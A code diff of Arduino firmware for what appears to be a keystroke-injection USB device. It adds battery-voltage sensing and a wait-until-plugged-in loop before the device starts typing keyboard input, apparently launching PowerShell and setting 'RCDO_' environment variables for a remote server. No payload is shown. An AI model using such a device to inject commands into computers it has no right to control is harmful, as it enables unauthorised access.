@@ -5,6 +5,46 @@ char userAgentConfig[] = "set RCDO_USERAGENT=firefox";
 char serverNameConfig[] = "set RCDO_SERVERPORT=localhost";
 char serverPortConfig[] = "set RCDO_SERVERNAME=5000";
 
+
+float getVCC() {
+  SYSCTRL->VREF.reg |= SYSCTRL_VREF_BGOUTEN;
+  while (ADC->STATUS.bit.SYNCBUSY == 1);
+  ADC->SAMPCTRL.bit.SAMPLEN = 0x1;
+  while (ADC->STATUS.bit.SYNCBUSY == 1);
+  ADC->INPUTCTRL.bit.MUXPOS = 0x19;         // Internal bandgap input
+  while (ADC->STATUS.bit.SYNCBUSY == 1);
+  ADC->CTRLA.bit.ENABLE = 0x01;             // Enable ADC
+  while (ADC->STATUS.bit.SYNCBUSY == 1);
+  ADC->SWTRIG.bit.START = 1;  // Start conversion
+  ADC->INTFLAG.bit.RESRDY = 1;  // Clear the Data Ready flag
+  while (ADC->STATUS.bit.SYNCBUSY == 1);
+  ADC->SWTRIG.bit.START = 1;  // Start the conversion again to throw out first value
+  while ( ADC->INTFLAG.bit.RESRDY == 0 );   // Waiting for conversion to complete
+  uint32_t valueRead = ADC->RESULT.reg;
+  while (ADC->STATUS.bit.SYNCBUSY == 1);
+  ADC->CTRLA.bit.ENABLE = 0x00;             // Disable ADC
+  while (ADC->STATUS.bit.SYNCBUSY == 1);
+  SYSCTRL->VREF.reg &= ~SYSCTRL_VREF_BGOUTEN;
+  float vcc = (1.1 * 1023.0) / valueRead;
+  return vcc;
+}
+
+// gets current input voltage
+float getBattVoltage(void) {
+  const int VBATTpin = A4;
+  float VCC = getVCC();
+
+  // Use resistor division and math to get the voltage
+  float resistorDiv = 0.5;
+  float ADCres = 1023.0;
+  float battVoltageReading = analogRead(VBATTpin);
+  battVoltageReading = analogRead(VBATTpin); // Throw out first value
+  float battVoltage = VCC * battVoltageReading / ADCres / resistorDiv;
+
+  return battVoltage;
+}
+
+
 char* selectModules(uint8_t menuSelected){
   char* modules = (char*)calloc(512,1);
   if (modules == NULL){
@@ -60,35 +100,26 @@ void setupConfig(){
 }
 
 void startBinary(int option){
-  /*
-  static uint32_t Oldmillis;
-  static uint32_t OldCount, Count;
   pinMode(LED_BUILTIN, OUTPUT);
+
+  // blocking loop until plugged in
   while(1){
-    if (millis() - Oldmillis > 10)
+    float battVoltageReading = getBattVoltage();
+    if (battVoltageReading < 4.25)
     {
-        Oldmillis = millis();
-        Count = (UOTGHS->UOTGHS_DEVFNUM & UOTGHS_DEVFNUM_FNUM_Msk) >> UOTGHS_DEVFNUM_FNUM_Pos;
-        if (OldCount == Count)
-        {
-          digitalWrite(LED_BUILTIN, HIGH);
-        }
-        else
-        {
-          digitalWrite(LED_BUILTIN, LOW);
-        }
-        OldCount = Count;
+      digitalWrite(LED_BUILTIN, HIGH);   // turn the LED on (HIGH is the voltage level)
+      delay(500);                       // wait for a second
+      digitalWrite(LED_BUILTIN, LOW);    // turn the LED off by making the voltage LOW
+      delay(500);  
+    }
+    else{
+      break; 
     }
   }
-    
-    digitalWrite(LED_BUILTIN, HIGH);   // turn the LED on (HIGH is the voltage level)
-    delay(1000);                       // wait for a second
-    digitalWrite(LED_BUILTIN, LOW);    // turn the LED off by making the voltage LOW
-    delay(1000);  
-    */ 
 
-
-  
+  // wait 1 sec to allow for higher success rates
+  // due to some funky windows USB recognition
+  delay(1000);
   Keyboard.begin();
   runPS();
   setupConfig();
@@ -109,4 +140,5 @@ void startBinary(int option){
   
   free(mods);
   Keyboard.end();
+  
 }
